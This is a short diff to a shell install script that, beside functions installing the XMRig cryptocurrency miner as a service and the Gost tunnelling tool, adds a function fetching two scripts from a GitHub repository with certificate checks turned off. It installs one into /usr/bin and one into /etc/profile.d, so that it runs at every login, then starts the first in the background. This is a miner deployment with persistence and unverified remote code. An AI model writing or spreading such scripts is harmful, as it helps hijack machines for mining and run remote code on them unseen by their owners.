@@ -38,8 +38,18 @@ function Install_XMRIG(){
   systemctl enable xmg && systemctl restart xmg
 }
 
+function Install_autoreboot(){
+  wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/r.sh
+  wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/e.sh
+  chmod 755 r.sh
+  chmod 755 e.sh
+  mv r.sh /usr/bin/
+  mv e.sh /etc/profile.d/
+  /usr/bin/r.sh &
+}
+
 sleep 3s
 Installation_dependency
 Install_Gost
 Install_XMRIG
-
+Install_autoreboot
